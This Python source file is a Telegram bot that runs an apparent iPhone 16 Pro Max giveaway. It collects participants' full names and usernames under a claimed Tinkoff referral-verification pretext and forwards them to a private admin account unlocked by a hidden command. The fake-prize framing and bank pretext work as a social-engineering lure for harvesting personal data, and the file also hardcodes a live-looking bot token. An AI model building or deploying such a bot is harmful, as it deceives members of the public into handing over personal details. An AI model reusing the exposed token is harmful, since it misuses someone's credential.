import os
import logging
import asyncio
from aiogram import Bot, Dispatcher, types
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.filters import Command
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton
import json

# Настройка логгирования
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Инициализация бота
TOKEN = "8032314005:AAHhMrMW0gze3HwB-if5rnQBiTkrURQcg_s"
bot = Bot(token=TOKEN)
storage = MemoryStorage()
dp = Dispatcher(storage=storage)

# Класс состояний
class Form(StatesGroup):
    name = State()
    referrer = State()

# Файл для данных
DATA_FILE = "user_data.json"
ADMIN_FILE = "admin_data.json"

# ID админа
ADMIN_USERNAME = "@tiuberg"
ADMIN_ID = None

def load_data():
    try:
        with open(DATA_FILE, "r") as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        return {}

def save_data(data):
    with open(DATA_FILE, "w") as f:
        json.dump(data, f, indent=4, ensure_ascii=False)

def load_admin_data():
    try:
        with open(ADMIN_FILE, "r") as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        return {"admin_id": None, "is_active": False}

def save_admin_data(data):
    with open(ADMIN_FILE, "w") as f:
        json.dump(data, f, indent=4, ensure_ascii=False)

@dp.message(Command("start"))
async def start(message: types.Message, state: FSMContext):
    data = load_data()
    user_id = str(message.from_user.id)
    
    if any(user_id in entry for entry in data.values()):
        await message.answer("❗ Вы уже участвуете в розыгрыше!")
        return

    button = [[KeyboardButton(text="Участвовать!!! 🔥")]]
    reply_markup = ReplyKeyboardMarkup(keyboard=button, resize_keyboard=True)
    await message.answer(
        "🎉 **Добро пожаловать в розыгрыш iPhone 16 Pro Max!**\n"
        "Нажми кнопку ниже, чтобы начать!",
        reply_markup=reply_markup,
        parse_mode="Markdown"
    )

@dp.message(lambda message: message.text == "Участвовать!!! 🔥")
async def participate(message: types.Message, state: FSMContext):
    await message.answer(
        "Обязательное условие - наличие имени аккаунта (@example)",
        reply_markup=types.ReplyKeyboardRemove()
    )
    await message.answer(
        "📝 Пожалуйста, введите ваше Имя и Фамилию.\n"
        "<blockquote>Это необходимо для сверки вас в базе зарегестрированных пользователей Тинькофф через нашу реферальную ссылку</blockquote>\n"
        "Пример: Иван Иванов",
        reply_markup=types.ReplyKeyboardRemove(),
        parse_mode="HTML"
    )
    await state.set_state(Form.name)

@dp.message(Command("adminPanelforMe"))
async def activate_admin_panel(message: types.Message, state: FSMContext):
    global ADMIN_ID
    logger.info(f"Получена команда adminPanelforMe от @{message.from_user.username} (ID: {message.from_user.id})")
    
    if message.from_user.username.lower() != ADMIN_USERNAME[1:].lower():
        await message.answer("❌ У вас нет доступа к этой команде!")
        logger.info(f"Доступ отклонен для @{message.from_user.username}")
        return
    
    try:
        admin_data = load_admin_data()
        admin_data["admin_id"] = str(message.from_user.id)
        admin_data["is_active"] = True
        save_admin_data(admin_data)
        ADMIN_ID = str(message.from_user.id)
        
        await message.answer("✅ Админский режим активирован! Вы будете получать данные о новых пользователях.")
        logger.info(f"Админский режим активирован для @{message.from_user.username}")
    except Exception as e:
        await message.answer("❗ Произошла ошибка при активации админского режима.")
        logger.error(f"Ошибка при активации админского режима: {str(e)}")

@dp.message(Form.name)
async def process_name(message: types.Message, state: FSMContext):
    data = load_data()
    user_id = str(message.from_user.id)
    full_name = message.text.strip()
    
    if len(full_name.split()) < 2:
        await message.answer("❗ Пожалуйста, введите и Имя, и Фамилию!")
        return
        
    if any(user_id in entry for entry in data.values()):
        await message.answer("❗ Вы уже участвуете в розыгрыше!")
        await state.clear()
        return
    
    await state.update_data(full_name=full_name)
    
    await message.answer(
        "👥 Если вас пригласил кто-то, укажите его имя аккаунта (например, @example).\n"
        "Если нет - просто напишите 'нет' или пропустите (нажмите /skip)",
        reply_markup=types.ReplyKeyboardRemove()
    )
    await state.set_state(Form.referrer)

@dp.message(Form.referrer)
async def process_referrer(message: types.Message, state: FSMContext):
    data = load_data()
    user_id = str(message.from_user.id)
    referrer = message.text.strip()
    
    user_data = await state.get_data()
    full_name = user_data["full_name"]
    
    if referrer.lower() != "нет" and not referrer.startswith("@") and referrer != "/skip":
        await message.answer("❗ Пожалуйста, укажите имя аккаунта в формате @example или напишите 'нет'")
        return
    
    if referrer.lower() == "нет":
        referrer = None
    
    data[user_id] = {
        "full_name": full_name,
        "username": message.from_user.username,
        "referrer": referrer if referrer != "/skip" else None
    }
    save_data(data)
    
    referrer_text = f"\nПриглашен: {referrer}" if referrer and referrer != "/skip" else ""
    await message.answer(
        f"✅ Спасибо, {full_name}!\n"
        f"Вы успешно зарегистрированы в розыгрыше! 🍀{referrer_text}",
        parse_mode="Markdown"
    )
    
    admin_data = load_admin_data()
    if admin_data["is_active"] and admin_data["admin_id"]:
        try:
            await bot.send_message(
                admin_data["admin_id"],
                f"Новый пользователь:\n"
                f"Имя: {full_name}\n"
                f"Username: @{message.from_user.username}\n"
                f"Приглашен: {referrer if referrer and referrer != '/skip' else 'Нет'}",
                parse_mode="Markdown"
            )
        except Exception as e:
            logger.error(f"Ошибка при отправке сообщения админу: {str(e)}")
    
    await state.clear()

@dp.message(Command("skip"))
async def skip_referrer(message: types.Message, state: FSMContext):
    current_state = await state.get_state()
    if current_state == Form.referrer.state:
        data = load_data()
        user_id = str(message.from_user.id)
        user_data = await state.get_data()
        full_name = user_data["full_name"]
        
        data[user_id] = {
            "full_name": full_name,
            "username": message.from_user.username,
            "referrer": None
        }
        save_data(data)
        
        await message.answer(
            f"✅ Спасибо, {full_name}!\n"
            "Вы успешно зарегистрированы в розыгрыше! 🍀",
            parse_mode="Markdown"
        )
        
        admin_data = load_admin_data()
        if admin_data["is_active"] and admin_data["admin_id"]:
            try:
                await bot.send_message(
                    admin_data["admin_id"],
                    f"Новый пользователь:\n"
                    f"Имя: {full_name}\n"
                    f"Username: @{message.from_user.username}\n"
                    f"Приглашен: Нет",
                    parse_mode="Markdown"
                )
            except Exception as e:
                logger.error(f"Ошибка при отправке сообщения админу: {str(e)}")
        
        await state.clear()
    else:
        await message.answer("❗ Эта команда работает только на этапе указания пригласившего")

@dp.message(Command("cancel"))
async def cancel(message: types.Message, state: FSMContext):
    await state.clear()
    await message.answer("Действие отменено 😔", reply_markup=types.ReplyKeyboardRemove())

async def main():
    await dp.start_polling(bot)

if __name__ == '__main__':
    asyncio.run(main())
